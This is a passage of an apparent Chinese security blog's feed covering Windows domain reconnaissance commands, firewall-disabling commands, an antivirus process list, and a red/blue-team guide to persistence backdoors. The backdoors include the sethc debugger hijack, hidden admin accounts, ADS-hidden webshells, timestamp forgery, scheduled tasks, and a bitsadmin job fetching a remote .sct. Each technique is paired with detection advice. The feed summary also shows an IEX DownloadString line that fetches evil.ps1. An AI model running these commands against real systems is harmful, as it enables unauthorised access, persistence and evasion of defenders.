class="comment">//如果在本地组里是administrators里边的，及是本地的系统管理员</span></span><br><span class="line"><span class="comment">//如果全局组中是domain users 既是普通域用户，如果在全局组中的domain admins 组里边，那么不光是域管理员还是域内所有机器的管理员（即会自动加入到域内机器的 administrtors 组里边）</span></span><br><span class="line"></span><br><span class="line">身份如下：</span><br><span class="line">Domain Admins <span class="comment">//域管理员（完全控制权限）</span></span><br><span class="line">Domain Computers <span class="comment">//域内机器</span></span><br><span class="line">Domain Controllers <span class="comment">//域控制器</span></span><br><span class="line">Domain Guest <span class="comment">//域访客，权限较低</span></span><br><span class="line">Domain Users <span class="comment">//域用户</span></span><br><span class="line">Enterprise Admins <span class="comment">//企业系统管理员用户（完全控制权限）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查看当前计算机信息以及是否在域下面</span></span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看域控服务器</span></span><br><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看域密码策略信息</span></span><br><span class="line">net accounts /domain</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询域</span></span><br><span class="line">net view</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询域内所有计算机</span></span><br><span class="line"><span class="comment">//dev有可能是开发服务器，web、app有可能是Web服务器，NAS可能是存储服务器，fileserver可能是文件服务器</span></span><br><span class="line">net view /domain:HACKE</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看主机开机时间</span></span><br><span class="line">net statistics workstation</span><br><span class="line"></span><br><span class="line"><span class="comment">//列出或断开本地计算机与所连接客户端的对话</span></span><br><span class="line">net session</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询本机共享列表</span></span><br><span class="line">net share</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="netsh-防火墙相关"><a href="#netsh-防火墙相关" class="headerlink" title="netsh-防火墙相关"></a>netsh-防火墙相关</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关闭防火墙</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable <span class="comment">//Windows Server 2003之前版本</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off <span class="comment">//Windows Server 2003之后版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查看防火墙配置</span></span><br><span class="line">netsh firewall show config</span><br><span class="line"></span><br><span class="line"><span class="comment">//允许指定程序进入（Windows Server 2003之前版本）</span></span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe <span class="string">&quot;allow nc&quot;</span> enable </span><br><span class="line"></span><br><span class="line"><span class="comment">//允许指定程序进入</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span> dir=in action=allow </span><br><span class="line"></span><br><span class="line"><span class="comment">//允许指定程序退出</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Allow nc&quot;</span> dir=out action=allow</span><br><span class="line"></span><br><span class="line"><span class="comment">//允许某端口放行</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Remote Desktop&quot;</span> protocol=TCP dir=in localport=<span class="number">3389</span> action=allow</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义防火墙日志的存储位置</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">&quot;C:\windows\&quot;</span></span><br></pre></td></tr></table></figure><h2 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h2><ul><li><p>参考： <a href="https://www.cnblogs.com/lsgxeva/p/8283662.html">Windows WMIC 命令使用详解(附实例)</a></p></li><li><p>集合命令集参考 <a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">wmic_info</a></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取安装的软件、版本信息</span></span><br><span class="line">wmic product get name,version</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询本机的服务信息</span></span><br><span class="line">wmic service <span class="built_in">list</span> brief</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看启动程序的信息</span></span><br><span class="line">wmic startup get command,caption</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看安装在系统中的补丁</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询本机共享列表</span></span><br><span class="line">wmic share get name,path,status</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看域内用户详细信息</span></span><br><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure><h2 id="ds-命令"><a href="#ds-命令" class="headerlink" title="ds 命令"></a>ds 命令</h2><p>ds 命令只能在 windows 服务器版本下才能运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查看存在的用户</span></span><br><span class="line">dsquery user</span><br></pre></td></tr></table></figure><h2 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h2><ul><li>常见杀毒软件进程名称</li></ul><table><thead><tr><th align="center">进程名</th><th align="center">软件名</th></tr></thead><tbody><tr><td align="center">360sd.exe</td><td align="center">360 杀毒</td></tr><tr><td align="center">360tray.exe</td><td align="center">360 实时防护</td></tr><tr><td align="center">ZhuDongFangYu.exe</td><td align="center">360 主动防御</td></tr><tr><td align="center">KSafeTray.exe</td><td align="center">金山卫士</td></tr><tr><td align="center">SafeDogUpdateCenter.exe</td><td align="center">服务器安全狗</td></tr><tr><td align="center">McAfee McShield.exe</td><td align="center">McAfee</td></tr><tr><td align="center">egui.exe</td><td align="center">NOD32</td></tr><tr><td align="center">AVP.EXE</td><td align="center">卡巴斯基</td></tr><tr><td align="center">avguard.exe</td><td align="center">小红伞</td></tr><tr><td align="center">bdagent.exe</td><td align="center">BitDefender</td></tr></tbody></table><h2 id="adfind-exe"><a href="#adfind-exe" class="headerlink" title="adfind.exe"></a>adfind.exe</h2><p>使用 adfind.exe</p><ul><li>下载链接： <a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">Adfind</a></li></ul><h2 id="nbtscan-exe"><a href="#nbtscan-exe" class="headerlink" title="nbtscan.exe"></a>nbtscan.exe</h2><p>使用 nbtscan.exe 进行域内存活主机的探测</p><ul><li>下载链接： <a href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a></li></ul><p>行末的提示对照表</p><table><thead><tr><th align="center">Token</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">SHARING</td><td align="center">该机器中存在正在运行的文件和打印共享服务，但不一定有内容共享</td></tr><tr><td align="center">DC</td><td align="center">该机器可能是域控制器</td></tr><tr><td align="center">U&#x3D;USER</td><td align="center">该机器中有登录名为 User 的用户</td></tr><tr><td align="center">IIS</td><td align="center">该机器可能安装了 IIS 服务器</td></tr><tr><td align="center">EXCHANGE</td><td align="center">该机器可能安装了 Exchange</td></tr><tr><td align="center">NOTES</td><td align="center">该机器可能安装了 Lotus Notes 电子邮件客户端</td></tr><tr><td align="center">?</td><td align="center">没有识别出该机器的 NetBIOS 资源（可以使用-F 选项再次扫描）</td></tr></tbody></table><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="[[Metasploit]]"></a>[[Metasploit]]</h2><h3 id="使用-TCP-模块进行端口扫描"><a href="#使用-TCP-模块进行端口扫描" class="headerlink" title="使用 TCP 模块进行端口扫描"></a>使用 TCP 模块进行端口扫描</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">use auxiliary/scanner/portscan/tcp <span class="comment">//或者使用其他端口扫描软件</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> RHOSTS <span class="number">1.2</span><span class="number">.3</span><span class="number">.4</span></span><br><span class="line"><span class="built_in">set</span> ports <span class="number">1</span><span class="number">-4000</span></span><br><span class="line"><span class="built_in">set</span> THREADS <span class="number">10</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="powershell-框架"><a href="#powershell-框架" class="headerlink" title="[[powershell]]框架"></a>[[powershell]]框架</h2><ul><li><p>nishang</p></li><li><p>powersploit</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;内网信息收集&quot;&gt;&lt;a href=&quot;#内网信息收集&quot; class=&quot;headerlink&quot; title=&quot;内网信息收集&quot;&gt;&lt;/a&gt;内网信息收集&lt;/h1&gt;&lt;h2 id=&quot;辅助命令&quot;&gt;&lt;a href=&quot;#辅助命令&quot; class=&quot;headerlink&quot; title=&quot;辅助命令&quot;&gt;&lt;/a&gt;辅助命令&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 隐藏窗口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-W Hidden&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-WindowStyle Hidden&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//非交互模式，不为用户提供交互提示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-NonI&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-NonInteractive&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//使用IEX（Invoke-Expression）进行远程脚本下载&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-IEX(New-ObjectNet.WebClient).DownloadString(&lt;span class=&quot;string&quot;&gt;&amp;quot;127.0.0.1/evil.ps1&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//不加载当前用户的配置文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-NoP&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-NoProfile&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//显示logo的启动&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-NoLogo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//执行后不退出shell，常用于键盘记录等&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-noexit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Penetration" scheme="https://resek4.github.io/categories/Penetration/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows 关键文件安全性排查(红蓝对抗)</title>
    <link href="https://resek4.github.io/2021/05/12/Windows%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5/"/>
    <id>https://resek4.github.io/2021/05/12/Windows%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5/</id>
    <published>2021-05-11T16:00:00.000Z</published>
    <updated>2023-02-26T05:25:33.791Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://xz.aliyun.com/t/4842#toc-1">windows 常见 backdoor、权限维持方法及排查技术</a></li></ul><h1 id="系统工具替换后门"><a href="#系统工具替换后门" class="headerlink" title="系统工具替换后门"></a>系统工具替换后门</h1><p>排查：autoruns 工具，下载地址： <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/autoruns">Autoruns for Windows v13.98</a><br>此后门易被检测<br>类似可被替换的程序有：</p><ul><li>osk.exe</li><li>Narrator.exe</li><li>Magnify.exe</li></ul><span id="more"></span><h2 id="utilman-辅助工具管理器"><a href="#utilman-辅助工具管理器" class="headerlink" title="[[utilman]]辅助工具管理器"></a>[[utilman]]辅助工具管理器</h2><p>![[utilman]]</p><h2 id="sethc-exe-轻松使用"><a href="#sethc-exe-轻松使用" class="headerlink" title="sethc.exe 轻松使用"></a>sethc.exe 轻松使用</h2><p>经典的 shift 后门</p><blockquote><p>修改注册表 <code>HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code> 下 <code>sethc.exe</code>，添加一个 <code>Debugger</code> 字符值（REG_SZ），并且赋值为 cmd.exe 的执行路径为 <code>C: \\windows\\system32\\cmd.exe</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><p>这里有更高阶的使用方法，且不会被 autoruns 检测到： <a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247483994&idx=1&sn=4041632680d059c6d9ed0aba0701ca71&chksm=cf4d8d3bf83a042d23216c02418ccbd377103f65b1b0eed0cbad61b055966bccd24c7637e495&mpshare=1&scene=23&srcid=&sharer_sharetime=1571196868049&sharer_shareid=be7a01e2434a36782542fb17e9d2a6e8#rd">打造不一样的 Shfit 映像劫持后门</a></p><h1 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h1><ul><li>创建克隆 administrator 账号，且通过命令 net user 以及控制面板中的管理账户无法看到。</li></ul><p>![[powershell#用户]]<br>1.创建后门用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></figure><p>2.之后将 administrator 用户对应的 Users 中的 F 值复制替换后门账户的 F 值<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xyghvuyxg.png?token=AEZI7DIYWX52ARXCXKWEAITC6RAOK"><br>3.导出 User 下面的后门账户以及 name 下面的后门账户两个文件。<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xuzcyvguyg.png?token=AEZI7DNIIPIUY2BGPGTS5L3C6RAPG"><br>4.通过命令删除刚才的后门用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></figure><p>5.通过注册表导入刚才保存的两个注册表<br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xtfgyt.png?token=AEZI7DK3M3D7U4ZLZ2ST4OTC6RAQK"><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/ycgvyg.png?token=AEZI7DJKOEIKIMMRJARTW4DC6RARW"></p><ul><li>参考文章 <a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">Windows 系统的帐户隐藏</a></li></ul><h1 id="明文账号记录"><a href="#明文账号记录" class="headerlink" title="明文账号记录"></a>明文账号记录</h1><ul><li>安全支持提供程序（SSP）是 Windows API，用于扩展 Windows 身份验证机制。 LSASS 进程在 Windows 启动期间加载安全支持提供程序 DLL。这个时候攻击者可以将精心构造的 dll 加载之，这个 dll 可获取到 lsass 进程中的明文账号密码信息。mimikatz(mimilib.dll 或 memssp 内存补丁方式)实现了这一功能，并把记录到的明文账号密码信息保存在本地。</li><li>详见文章 <a href="https://pentestlab.blog/2019/10/21/persistence-security-support-provider/">Persistence – Security Support Provider</a></li></ul><h1 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h1><h2 id="attrib-命令隐藏"><a href="#attrib-命令隐藏" class="headerlink" title="attrib 命令隐藏"></a>attrib 命令隐藏</h2><ul><li>windows 自带命令行工具 attrib 用来显示或更改文件属性。</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xczviuhiu.png?token=AEZI7DO6XQN3PLQXOKWLL7DC6RAS6"></p><ul><li>优点:简单</li><li>缺点:暂无</li><li>排查:使用 attrib 命令或者 D 盾</li></ul><h2 id="使用-ADS-流隐藏-webshell"><a href="#使用-ADS-流隐藏-webshell" class="headerlink" title="使用 ADS 流隐藏 webshell"></a>使用 ADS 流隐藏 webshell</h2><blockquote><p>ADS 即 NTFS 文件流</p></blockquote><ul><li>使用 ADS 流隐藏 webshell,目前可过 D 盾扫描,注意 ADS 的一句话木马无法直接连接，可以使用 php 的 include 去包含执行</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/pxklpk.png?token=AEZI7DIQMADNYC3PMKANSTTC6RAU6"><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xygyg.png?token=AEZI7DOSPP73ONERCQD3GR3C6RAWA"></p><ul><li>文章参考： <a href="https://www.cnblogs.com/xiaozi/p/7610984.html">利用 ADS 隐藏 webshell</a><br>  文章参考： <a href="https://www.freebuf.com/articles/terminal/195721.html">Windows ADS 在渗透测试中的妙用</a></li><li>此外应该注意修改文件的 timestamp，可使用如下的[[powershell]]命令或者使用 NewFileTime 工具</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(Get-Item ).creationtime=$(Get-Date <span class="string">&quot;mm/dd/yyyy hh:mm am/pm&quot;</span>)</span><br><span class="line">$(Get-Item ).lastaccesstime=$(Get-Date <span class="string">&quot;mm/dd/yyyy hh:mm am/pm&quot;</span>)</span><br><span class="line">$(Get-Item ).lastwritetime=$(Get-Date <span class="string">&quot;mm/dd/yyyy hh:mm am/pm&quot;</span>)</span><br><span class="line">example：</span><br><span class="line">Set the last-access time <span class="keyword">for</span> a file aaa.csv to the current time:  $(Get-Item aaa.csv).lastwritetime=$(Get-Date)</span><br><span class="line">Set the creation time of a file foo.txt to November <span class="number">24</span>, <span class="number">2015</span>, at <span class="number">6</span>:<span class="number">00</span>am: $(Get-Item foo.txt).creationtime=$(Get-Date <span class="string">&quot;11/24/2015 06:00 am&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>优点：较难检测</li><li>缺点：暂无</li><li>排查： dir &#x2F;r</li></ul><h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><ul><li>schtasks 和 at 命令，例如下面的命令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#from https://github.com/diggles9991/MG/blob/master/XMR/Hook.ps1#L12</span><br><span class="line"># Update scheduled Start Task</span><br><span class="line">SCHTASKS /Delete /tn &quot;AdobeReaderUpdate&quot; /f</span><br><span class="line">SCHTASKS /Create /RU &quot;SYSTEM&quot; /tn &quot;AdobeReaderUpdate&quot; /sc Weekly /d * /st 18:00:00 /tr &quot;powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1&quot;</span><br><span class="line"></span><br><span class="line"># Update scheduled End Task</span><br><span class="line"># SCHTASKS /Delete /tn &quot;AdobeReaderUpdateEnd&quot; /f</span><br><span class="line">SCHTASKS /Create /RU &quot;SYSTEM&quot; /tn &quot;AdobeReaderUpdateEnd&quot; /sc Weekly /d MON,TUE,WED,THU,FRI /st 06:00:00 /tr &quot;powershell.exe Stop-Process -Name $processname&quot;</span><br><span class="line"></span><br><span class="line"># At command</span><br><span class="line">at 1:00AM /Every:Saturday My_BackUp.bat </span><br><span class="line">在每个Saturday的早上1:00点，定时启动My_BackUp.bat批处理文件。</span><br></pre></td></tr></table></figure><ul><li>优点：简单</li><li>缺点：易被检测</li><li>排查： schtasks &#x2F;query 命令进行查询或者通过计算机的管理查看，注意在 windows 的中文版系统中，schtasks 命令需要切换字符为美国英语格式，使用命令 chcp 437，或者直接工具 autoruns。</li></ul><h1 id="开机启动项"><a href="#开机启动项" class="headerlink" title="开机启动项"></a>开机启动项</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br><span class="line">等</span><br></pre></td></tr></table></figure><ul><li>优点：重启权限维持</li><li>缺点：一般杀软均会拦截</li><li>排查：一个一个手工查太麻烦，建议直接上 autoruns。</li><li>20191022 更新</li><li>利用 windows 原生 API 去创建 regedit.exe 不能展示和导出的键值对</li><li>详见文章 <a href="https://github.com/ewhitehats/InvisiblePersistence/blob/master/InvisibleRegValues_Whitepaper.pdf">invisible Reg Values</a> ,缺点只是通过regedit.exe查看时候有隐藏效果，通过autoruns等工具还是会被发现。</li></ul><h1 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create [ServerName] binPath= BinaryPathName</span><br></pre></td></tr></table></figure><ul><li>优点：重启权限维持</li><li>缺点：一般杀软会拦截</li><li>排查：工具 autoruns</li></ul><h1 id="waitfor-exe"><a href="#waitfor-exe" class="headerlink" title="waitfor.exe"></a>waitfor.exe</h1><ul><li>不支持自启动，但可远程主动激活，后台进程显示为 waitfor.exe</li></ul><p><a href="https://github.com/3gstudent/Waitfor-Persistence">详细参考</a></p><ul><li>优点：远程主动激活</li><li>缺点：有 waitfor 进程</li><li>排查：通过 Process Explorer 工具查看是否有 waitfor.exe 进程，并进一步查看启动参数等。</li></ul><h1 id="bitsadmin-后门"><a href="#bitsadmin-后门" class="headerlink" title="bitsadmin 后门"></a>bitsadmin 后门</h1><ul><li>Bitsadmin 从 win7 之后操作系统就默认包含，可以用来创建上传或者下载任务。Bistadmin 可以指定下载成功之后要进行什么命令。后门就是利用的下载成功之后进行命令执行。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#创建一个下载任务：</span><br><span class="line">bitsadmin /create backdoor</span><br><span class="line">#添加文档：</span><br><span class="line">bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe</span><br><span class="line">#设置下载成功之后要执行的命令：</span><br><span class="line">bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll&quot;</span><br><span class="line">#执行任务：</span><br><span class="line">bitsadmin /Resume backdoor</span><br></pre></td></tr></table></figure><ul><li>可以参考这篇文章</li></ul><p><a href="https://paper.tuisec.win/detail/77720db7618e92c">bitsadmin-backdoor-权限维持后门</a></p><ul><li>优点：系统自带无需上传</li><li>缺点：免杀效果一般</li><li>排查：bitsadmin &#x2F;list &#x2F;verbose</li></ul><h1 id="WMI-后门-重点"><a href="#WMI-后门-重点" class="headerlink" title="WMI 后门(重点!)"></a><strong>WMI 后门(重点!)</strong></h1><ul><li>在 2015 年的 blackhat 大会上 Matt Graeber 介绍了一种无文件后门就是用的 wmi。 <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf">更多可以参考</a></li><li>在 empire 中有相应的 module，作者参考使用了 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/9e771d15bf19ab3c2ac196393c088ecdab6c9a73/Persistence/Persistence.psm1">Powersploit</a> 里面的代码。</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/wmxh.png?token=AEZI7DJ6WO5BGEE7QUW6FIDC6RAXK"><br><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xcvhuuxh.png?token=AEZI7DJGZT67ARDFVABQZY3C6RAYG"></p><ul><li>后门在系统重启五分钟之内触发且是 system 权限。</li><li>优点：无文件，相对来说难以排查</li><li>缺点：暂无</li><li>排查：工具 autoruns</li></ul><h1 id="COM-劫持"><a href="#COM-劫持" class="headerlink" title="COM 劫持"></a>COM 劫持</h1><ul><li>可以参考文章 <a href="https://www.freebuf.com/articles/system/115241.html">打开文件夹就运行？COM 劫持利用新姿势</a></li><li><a href="https://www.4hou.com/technology/6863.html">利用 CLR 实现一种无需管理员权限的后门</a> “主动型”后门，WMI添加环境变量需要重启系统生效</li><li>优点:隐藏性较好,autoruns 查不到</li><li>缺点:暂无</li><li>排查:检查环境变量和注册表键值<br>  <a href="https://xzfile.aliyuncs.com/media/upload/picture/20190417211806-3cfc2272-6113-1.png"></a></li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/xzcvzuyghvuays.png?token=AEZI7DOCPJD3GUUSZSKTNBDC6RAZI"></p><h1 id="meterpreter-权限维持"><a href="#meterpreter-权限维持" class="headerlink" title="meterpreter 权限维持"></a>meterpreter 权限维持</h1><ul><li>meterpreter 中的权限维持技术有两种，一种是 metsvc 的后门(服务后门)，另外一种是 persistence(注册表后门)</li><li>metsvc 是开机自启动的服务型后门</li></ul><p><img src="https://imgbasement-1258658376.cos.ap-beijing.myqcloud.com/zxcuvyguy.png?token=AEZI7DLZW7I2WICQNJGZ6IDC6RA2A"></p><ul><li><p><a 